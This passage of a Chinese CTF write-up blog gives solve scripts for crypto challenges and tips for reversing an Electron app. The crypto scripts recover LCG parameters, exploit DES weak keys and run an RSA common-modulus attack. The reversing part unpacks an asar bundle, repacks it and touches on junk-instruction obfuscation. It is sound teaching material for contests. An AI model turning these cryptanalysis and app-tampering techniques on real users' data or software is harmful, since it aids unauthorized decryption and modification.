class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">5944442525761903973219225838876172353829065175803203250803344015146870499</span></span><br><span class="line"><span class="string">141002272698398325287408425994092371191022957387708398440724215884974524650</span></span><br><span class="line"><span class="string">42216026849704835847606250691811468183437263898865832489347515649912153042</span></span><br><span class="line"><span class="string">67696624031762373831757634064133996220332196053248058707361437259689848885</span></span><br><span class="line"><span class="string">19724224939085795542564952999993739673429585489399516522926780014664745253</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这个是LCG线性同余随机数生成器</p><p>原理是<a href="https://zer0yu.github.io/2018/11/02/Cracking-LCG/">攻击线性同余生成器(LCG) (zer0yu.github.io)</a></p><p>过程：</p><ol><li>求m</li><li>求a</li><li>求b</li><li>求seed</li></ol><p>这里由于是间隔一个来给X，所以求到$a^2$之后不好求a，太大了，所以要以$a^2$作为新的a，$(a+1)b$作为新的b</p><p>求到后就可以穷举2的16次方爆flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gy</span><br><span class="line">x0 = <span class="number">5944442525761903973219225838876172353829065175803203250803344015146870499</span></span><br><span class="line">x1 = <span class="number">141002272698398325287408425994092371191022957387708398440724215884974524650</span></span><br><span class="line">x2 = <span class="number">42216026849704835847606250691811468183437263898865832489347515649912153042</span></span><br><span class="line">x3 = <span class="number">67696624031762373831757634064133996220332196053248058707361437259689848885</span></span><br><span class="line">x4 = <span class="number">19724224939085795542564952999993739673429585489399516522926780014664745253</span></span><br><span class="line"></span><br><span class="line">d0 = x1 - x0</span><br><span class="line">d1 = x2 - x1</span><br><span class="line">d2 = x3 - x2</span><br><span class="line">d3 = x4 - x3</span><br><span class="line"></span><br><span class="line">k1 = d2*d0 - d1*d1</span><br><span class="line">k2 = d3*d0 - d1*d2</span><br><span class="line">m = math.gcd(k1,k2)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">inv_d0 = gy.invert(d0,m)</span><br><span class="line">pa = d1*inv_d0 % m</span><br><span class="line"><span class="built_in">print</span>(pa)</span><br><span class="line"></span><br><span class="line">b = x1 - pa*x0 % m</span><br><span class="line">inv_a = gy.invert(pa,m)</span><br><span class="line">seed = inv_a * (x0-b)%m</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    seed = inv_a * (seed-b)% m</span><br><span class="line">    flag = long_to_bytes(seed)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"> <span class="comment">#b&#x27;flag&#123;Hello_CTF&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>还有第二种方法</p><p>Grobner基求解多项式多个根，但是不会，给个D神的链接QAQ</p><p><a href="https://dexterjie.github.io/2023/07/05/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81-LCG/">LCG | DexterJie’Blog</a></p><h3 id="EzDES"><a href="#EzDES" class="headerlink" title="EzDES"></a>EzDES</h3><p>一开始没想到QAQ</p><p><a href="https://lightless.me/archives/DES-Weak-Keys.html">DES 弱密钥 - lightless blog</a>看看佬的blog</p><blockquote><p>有四个弱密钥是绝对不能使用的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x01\x01\x01\x01\x01\x01\x01\x01</span><br><span class="line">\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE</span><br><span class="line">\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1</span><br><span class="line">\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E</span><br></pre></td></tr></table></figure><p>如果不考虑校验位的密钥，下面几个也是属于弱密钥的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF</span><br><span class="line">\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0</span><br><span class="line">\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F</span><br></pre></td></tr></table></figure><p>如果使用弱密钥，PC1 计算的结果会导致轮密钥全部为 0，全部为 1 或全部 01 交替。<br>因为所有的轮密钥都是一样的，并且 DES 是 Feistel 网络的结构，这就导致加密函数是自反相 (self-inverting) 的，结果就是加密一次看起来没什么问题，但是如果再加密一次就得到了明文。</p></blockquote><blockquote><h2 id="部分弱密钥"><a href="#部分弱密钥" class="headerlink" title="部分弱密钥"></a>部分弱密钥</h2><p>部分弱密钥是指只会在计算过程中产生两个不同的子密钥，每一个在加密的过程中使用 8 次。这就意味着这对密钥 K1 和 K2 有如下性质：<br><img src="https://upload.wikimedia.org/math/0/e/c/0ec16658b1f5ae9031cb4993692794dc.png" alt="部分弱密钥性质"></p><p>6 个常见的部分弱密钥对</p><ul><li>0x011F011F010E010E and 0x1F011F010E010E01</li><li>0x01E001E001F101F1 and 0xE001E001F101F101</li><li>0x01FE01FE01FE01FE and 0xFE01FE01FE01FE01</li><li>0x1FE01FE00EF10EF1 and 0xE01FE01FF10EF10E</li><li>0x1FFE1FFE0EFE0EFE and 0xFE1FFE1FFE0EFE0E</li><li>0xE0FEE0FEF1FEF1FE and 0xFEE0FEE0FEF1FEF1</li></ul><p>OpenSSL 中对弱密钥的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">119</span> <span class="type">static</span> <span class="type">const</span> DES_cblock weak_keys[NUM_WEAK_KEY]=&#123;</span><br><span class="line"><span class="number">120</span>     <span class="comment">/* weak keys */</span></span><br><span class="line"><span class="number">121</span>     &#123;<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">122</span>     &#123;<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">123</span>     &#123;<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">124</span>     &#123;<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">125</span>     <span class="comment">/* semi-weak keys */</span></span><br><span class="line"><span class="number">126</span>     &#123;<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">127</span>     &#123;<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">128</span>     &#123;<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">129</span>     &#123;<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">130</span>     &#123;<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">131</span>     &#123;<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">132</span>     &#123;<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">133</span>     &#123;<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">134</span>     &#123;<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">135</span>     &#123;<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">136</span>     &#123;<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">137</span>     &#123;<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><h2 id="有弱密钥的加密算法"><a href="#有弱密钥的加密算法" class="headerlink" title="有弱密钥的加密算法"></a>有弱密钥的加密算法</h2><ul><li>DES</li><li>RC4</li><li>IDEA</li><li>Blowfish</li></ul></blockquote><p>摘抄完QAQ，再根据提示</p><p>二次加密得到明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;t\xe4f\x19\xc6\xef\xaaL\xc3R&#125;\x08;K\xc9\x88\xa6|\nF\xc3\x12h\xcd\xd3x\xc3(\x91\x08\x841\xca\x8b\xc1\x94\xb5\x9f[\xcd\xc6\x9f\xf9\xf6\xca\xf5\x1a\xda\x16\xcf\x89\x154\xa1\xfe\xc5\x16\xcf\x89\x154\xa1\xfe\xc5&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;0101010101010101&#x27;</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc = des.encrypt(pad(flag,<span class="number">64</span>))</span><br><span class="line"><span class="built_in">print</span>(enc[:enc.find(<span class="string">b&#x27;&#125;&#x27;</span>)+<span class="number">1</span>])</span><br><span class="line"><span class="comment">#b&#x27;DRKCTF&#123;We4k_K3y_1s_V3ry_D4nger0us_In_DES&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="MidRSA"><a href="#MidRSA" class="headerlink" title="MidRSA"></a>MidRSA</h3><div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">这道题没写完</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_Key1</span>(<span class="params">ebits</span>):</span><br><span class="line">    e = [getPrime(ebits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">message,e</span>):</span><br><span class="line">    n = gmpy2.next_prime(bytes_to_long(message) &lt;&lt; <span class="number">300</span>)</span><br><span class="line">    m = getPrime(<span class="number">256</span>)</span><br><span class="line">    c = [<span class="built_in">int</span>(<span class="built_in">pow</span>(m,e[i],n)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e))]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_Key2</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = [random.getrandbits(nbits // <span class="number">4</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">return</span> n,e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">message,e,n</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    c = [<span class="built_in">int</span>(<span class="built_in">pow</span>(m,e[i],n)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e))]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">    </span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;DRKCTF&#123;&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">flag2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">ebits = <span class="number">7</span></span><br><span class="line">e1 = generate_Key1(ebits)</span><br><span class="line">cipher1 = encrypt1(flag1,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cipher1 =&quot;</span>,cipher1)</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">n,e2 = generate_Key2(nbits)</span><br><span class="line">cipher2 = encrypt2(flag2,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cipher2 =&quot;</span>,cipher2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e1 = [109, 71, 109, 73]</span></span><br><span class="line"><span class="string">cipher1 = [36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080, 36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871]</span></span><br><span class="line"><span class="string">e2 = [79572758141493570128961125255246129069540961757778793209698370333142346488381, 80555585862127636800866563977080055603517001358195529410497461746213789997225, 44651921320695090688745333790065512192118202496468714141526113242887125432380]</span></span><br><span class="line"><span class="string">cipher2 = [58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057, 16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337, 80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546]</span></span><br><span class="line"><span class="string">n = 93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>第一部分</p>这里有两个c，知道n是m<<300，只要找到模数n，就找到了m，构造$c_i=m^{e_i} \mod n$改写成${c_i}^{e_j}={{m^{e_i}}^{e_j}} ={c_j}^{e_i}\mod n$<p>这样两数之差就是kn，再来一个kn，求gcd即可</p><p>第二部分</p><p>这里重看一下共模攻击和CRT：</p><p><a href="https://www.cnblogs.com/ailanxier/p/13370753.html">中国剩余定理(CRT)及其扩展(EXCRT)详解 - ailanxier - 博客园 (cnblogs.com)</a></p><p>这里要想到三个e对应三个方程，不能简单当成gcd(e1,e2,e3)</p><p>把它当成两次共模攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from prism import *</span></span><br><span class="line"><span class="comment"># from math import *</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e1 = [<span class="number">109</span>, <span class="number">71</span>, <span class="number">109</span>, <span class="number">73</span>]</span><br><span class="line">cipher1 = [<span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080</span>, <span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871</span>]</span><br><span class="line"></span><br><span class="line">d1 = cipher1[<span class="number">0</span>]**e1[<span class="number">1</span>] - cipher1[<span class="number">1</span>]**e1[<span class="number">0</span>]</span><br><span class="line">d2 = cipher1[<span class="number">2</span>]**e1[<span class="number">3</span>] - cipher1[<span class="number">3</span>]**e1[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">n = gcd(d1,d2)</span><br><span class="line"></span><br><span class="line">m1 = n&gt;&gt;<span class="number">300</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(m1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e2 = [<span class="number">79572758141493570128961125255246129069540961757778793209698370333142346488381</span>, <span class="number">80555585862127636800866563977080055603517001358195529410497461746213789997225</span>, <span class="number">44651921320695090688745333790065512192118202496468714141526113242887125432380</span>]</span><br><span class="line">c2 = [<span class="number">58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057</span>, <span class="number">16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337</span>, <span class="number">80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546</span>]</span><br><span class="line">n = <span class="number">93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">  g, x, y = egcd(a, m)</span><br><span class="line">  <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">_,s1, s2 = gmpy2.gcdext(e2[<span class="number">0</span>],e2[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c2[<span class="number">0</span>] = modinv(c2[<span class="number">0</span>], n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2[<span class="number">1</span>] = modinv(c2[<span class="number">1</span>], n)</span><br><span class="line"><span class="comment"># print(t)</span></span><br><span class="line">m2 = <span class="built_in">pow</span>(c2[<span class="number">0</span>], s1, n) * <span class="built_in">pow</span>(c2[<span class="number">1</span>], s2, n) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2))</span><br><span class="line"><span class="comment">#b&#x27;DRKCTF&#123;5d0b96e8-e069-4378-82e7-120e4b761a0b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="elec-go"><a href="#elec-go" class="headerlink" title="elec_go"></a>elec_go</h3><p>佬出的题，第一次见</p><p>根据</p><p><a href="https://www.52pojie.cn/thread-1847258-1-1.html">Electron编写的exe 逆向思路 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install asar -<span class="keyword">g</span></span><br><span class="line"><span class="keyword">cd</span> apps</span><br><span class="line">asar extract <span class="keyword">app</span>.asar <span class="keyword">app</span> <span class="comment">//解压拿到源码</span></span><br><span class="line">asar pack <span class="keyword">app</span> <span class="keyword">app</span>.asar <span class="comment">//重新打包</span></span><br></pre></td></tr></table></figure><p>打开js源代码，有一个base64，解密之后发现是aes，但是不知道key，直接写一个</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  dialog.<span class="title function_">showMessageBox</span>(&#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">`k3y 的值是：<span class="subst">$&#123;k3y.toString()&#125;</span>`</span>,</span><br><span class="line">    <span class="attr">buttons</span>: [<span class="string">&#x27;OK&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>重新打包，拿到key的值，在线解密</p><p><img src="https://s2.loli.net/2024/05/30/ugIApJS6XdPciaH.png" alt="image-20240530225931951"></p><h3 id="flower-tea"><a href="#flower-tea" class="headerlink" title="flower_tea"></a>flower_tea</h3><p>在这里说一下出题思路吧QAQ</p><p>这个题本来是想考一下去花指令的，没想到有佬直接调出来了，tql</p><p>花指令基本都很萌新QAQ，对栈做操作或者call，ret。</p><p>想了一下，可能反调试比花出的还好一点。毕竟x64的和x86有一点不一样。</p><p>感觉还有可以改进的地方：</p><p>隐藏交叉引用-用多级指针来隐藏交叉引用<br>真tea中jmp修正为jz和jnz，这样能起到一些混淆的作用<br>防止附加调试-在scanf之后再次判断调试状态，修改hook</p><p>但是都不会QAQ，还是要好好学，下面抄的官方wp</p><p>观察main函数：<br>主函数的大概是这样。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828856-dd977d3e-329b-4748-adea-648e1ca77d81.png#averageHue=%2320201f&clientId=u9fbe6832-1fb1-4&from=paste&id=u4cff4822&originHeight=843&originWidth=1134&originalType=url&ratio=1&rotation=0&showTitle=false&size=45021&status=done&style=none&taskId=ucfe2b2a2-9d0a-4981-9d9d-5cd31dff461&title=" alt="image.png"><br>如果要调试，要先把第一个函数nop掉（实际上并不用）<br>这里先看encode函数，点开后是爆红的，所以先解花指令<br><img 